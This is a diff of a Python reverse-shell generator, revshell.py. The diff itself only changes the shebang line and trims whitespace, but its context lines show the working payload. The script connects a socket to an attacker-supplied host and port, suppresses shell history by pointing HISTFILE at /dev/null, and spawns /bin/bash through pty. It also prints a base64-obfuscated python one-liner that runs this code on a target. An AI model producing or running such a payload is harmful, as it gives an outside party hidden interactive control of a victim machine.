@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 
 import base64
 from colorama import Fore, Style
@@ -16,7 +16,7 @@ s.connect(('{}', {}))
 os.putenv("HISTFILE", '/dev/null')
 pty.spawn("/bin/bash")'''.format(ip, port)
     print(Style.BRIGHT + Fore.RED + "python{} -c \"import base64;exec(compile(base64.b64decode(b'{}'),'<string>','exec'))\"".format(version, str(base64.b64encode(CODE.encode("utf-8"))).split('\'')[1]))
-    
+
 if __name__ == '__main__':
 
     if len(sys.argv)  == 3:
@@ -26,4 +26,3 @@ if __name__ == '__main__':
     else:
         print(Style.BRIGHT + Fore.BLUE + "Usage: revshell.py <LHOST> <LPORT> [PYTHON_VERSION]")
         raise SystemExit
- 
